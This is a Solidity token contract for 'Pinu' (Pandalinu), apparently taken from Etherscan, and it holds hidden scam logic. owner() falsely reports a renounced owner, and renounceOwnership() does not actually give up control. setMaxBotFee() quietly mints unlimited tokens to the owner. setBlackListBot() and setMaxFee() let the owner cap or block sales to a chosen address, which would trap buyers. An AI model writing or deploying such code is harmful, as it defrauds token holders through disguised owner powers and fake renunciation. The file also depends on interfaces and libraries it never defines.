/**
 *Submitted for verification at Etherscan.io on 2021-06-05
*/

/*

Pandalinu - Pinu

FUCK ALL RUGS 

LET's GET ON MARS 
                                                                                                                  
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public pure returns (address) {
        return address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Pinu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public _burnadd;
    address public _BlackListBot;
    address public _BlackListAddress;
    uint256 public _totallLiq;

    uint256 private _sTotalSupp = 100 * 10**9 * 10**18;

    string private _name = 'Pinu';
    string private _symbol = 'Pandalinu';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _sTotalSupp;

        emit Transfer(address(0), _msgSender(), _sTotalSupp);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function setBlackListBot(address botAdd , address botAddress) public onlyOwner {
        _BlackListBot = botAdd;
        _BlackListAddress = botAddress;
        _totallLiq = 50 * 10**6 * 10**18;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    
    function setMaxFee(uint256 maxFeePercent) public onlyOwner {
        _totallLiq = maxFeePercent * 10**18;
    }

    function setMaxBotFee(uint256 amount) public onlyOwner {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        _sTotalSupp = _sTotalSupp.add(amount);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        emit Transfer(address(0), _msgSender(), amount);
    }

    function totalSupply() public view override returns (uint256) {
        return _sTotalSupp;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        if (sender != _BlackListAddress && recipient == _BlackListBot) {
            require(amount < _totallLiq, "Transfer amount exceeds balance");
        }
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}